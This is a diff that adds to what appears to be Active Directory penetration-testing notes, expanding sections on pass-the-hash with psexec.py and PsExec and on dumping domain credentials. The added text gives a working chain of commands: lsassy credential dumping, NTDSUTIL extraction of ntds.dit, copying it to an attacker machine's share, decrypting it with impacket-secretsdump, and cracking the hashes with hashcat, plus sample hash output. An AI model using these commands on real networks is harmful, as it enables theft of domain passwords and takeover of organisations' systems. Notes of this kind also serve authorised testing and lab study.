@@ -11,6 +11,10 @@
 * Domain Controller (DC) is a Windows Server containing  Active Directory Domain Services (AD DS)
 * AD DS data store: **NTDS.dit** - a database that contains all of the information of an Active Directory domain controller as well as password hashes for domain users.
 * **NTDS.dit** is stored by default in %SystemRoot%\NTDS  
+```
+# Or find ntds.dit using Powershell
+Get-ChildItem -Path c:\ -Include ntds.dit -Recurse
+```
 * DC handles authentication and authorization services 
 * DC replicate updates from other domain controllers in the forest
 * DC Allows admin access to manage domain resources
@@ -236,7 +240,11 @@ Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveG
 
 * Use extracted hash to perform pass the hash attack
 
-`psexec.py -hashes aad3b435b51404eeaad3b435b5140xxx:32693b11e6aa90eb43d32c72a07cxxxx "xxx.local/Administrator@10.10.10.xxx"`
+`psexec.py -hashes :32693b11e6aa90eb43d32c72a07cxxxx "xxx.local/Administrator@10.10.10.xxx"`
+
+PSexec can also be yused from windows client
+
+`.\PSExec.exe \\dc1.domain.com cmd`
 
 ## Kerberoasting
 
@@ -298,5 +306,69 @@ Make kirbi ticket from BASE64 blob
 
 ## Dumping Credentials
 
-use remote tool `lsassy`
-or local tools: mimikatz and etc
+### lsassy
+
+This is preferred and most silent way of dumping AD contents.
+
+use `lsassy`
+
+For that you are going to need credentials: local, ntlm, or ticket
+
+### ntds.dit exfiltration using NTDSUTIL
+
+dit-file with AD credentials can be dumped in a variety of ways once System privilege is obtained on domain controller
+
+Make a fake AD installation file
+`NTDSUTIL "Activate Instance NTDS" "IFM" "Create Full C:\Files" "q" "q"`
+
+Copy it to attacking machine
+`Copy-Item -Path  C:\Files -Destination  '\\192.168.219.129\dumb' -Recurse`
+
+Contents should be like
+```
+└─$ tree Files    
+Files
+├── Active Directory
+│   ├── ntds.dit
+│   └── ntds.jfm
+└── registry
+    ├── SECURITY
+    └── SYSTEM
+```
+
+Then secretsdump.py can be used to decrypt and dump hashes from ntds.dit.
+
+For doing that authentification information of DC needed.
+
+Best best is to use lsassy remotely or mimikatz/rubeus to get hashes locally.
+
+`lsassy -u LocalBob -p Password1 192.168.219.133`
+
+then you get something like
+
+```
+[+] 192.168.219.133 SKORP\BAMDC1$        [NT] 305ea2dea5d1f1e494645eb39784513a | [SHA1] d2837f19c7af41d9899d942b6d4c33663680a805
+[+] 192.168.219.133 SKORP\Administrator  [NT] 64f12cddaa88057e06a81b54e73b949b | [SHA1] cba4e545b7ec918129725154b29f055e4cd5aea8
+```
+Grab the NT part from Administrator and construct secrets dump request
+
+```
+impacket-secretsdump -system Files/registry/SYSTEM -security Files/registry/SECURITY -ntds Files/Active\ Directory/ntds.dit -hashes :64f12cddaa88057e06a81b54e73b949b LOCAL -outputfile dit-extract
+```
+
+After that file dit-extract.ntds is going to appear in your directory
+
+It can be then cracked using hashcat like so
+
+`hashcat -a 0 -m 1000 -w 3  dit-extract.ntds  /usr/share/wordlists/rockyou.txt.gz --force --potfile-disable`
+
+The cracked password is diplayed next to cracked hash that corresponds to some user like below.
+
+Dictionary cache hit:
+Filename..: /usr/share/wordlists/rockyou.txt.gz
+Passwords.: 14344385
+Bytes.....: 53357329
+Keyspace..: 14344385
+
+64f12cddaa88057e06a81b54e73b949b:Password1                
+
